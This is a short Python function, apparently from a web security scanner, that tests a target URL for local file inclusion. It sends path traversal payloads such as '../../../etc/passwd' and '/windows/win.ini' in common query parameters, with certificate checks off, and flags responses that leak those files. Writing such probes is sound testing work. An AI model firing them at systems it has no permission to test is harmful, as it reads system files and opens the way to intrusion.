"""Test for Local/Remote File Inclusion vulnerabilities."""

import httpx
from urllib.parse import urlparse


async def lfi_detect(target: str, param: str = "") -> dict:
    if not target.startswith(("http://", "https://")):
        target = f"https://{target}"

    payloads = ["/etc/passwd", "../../../etc/passwd", "../../../../../../etc/passwd", "/windows/win.ini"]
    test_params = [param] if param else ["file", "page", "path", "include", "doc", "view", "load"]

    results = []
    async with httpx.AsyncClient(timeout=15.0, follow_redirects=False, verify=False) as client:
        base = target.split("?")[0]
        for p in test_params:
            for payload in payloads:
                try:
                    resp = await client.get(f"{base}?{p}={payload}")
                    text = resp.text.lower()
                    ind = []
                    if "root:x:0:0" in text:
                        ind.append("/etc/passwd leak")
                    if "[extensions]" in text:
                        ind.append("win.ini leak")
                    if ind:
                        results.append({"parameter": p, "payload": payload, "status": resp.status_code, "indicators": ind})
                        break
                except httpx.HTTPError:
                    continue

    return {"target": target, "found": results, "count": len(results), "vulnerable": len(results) > 0}
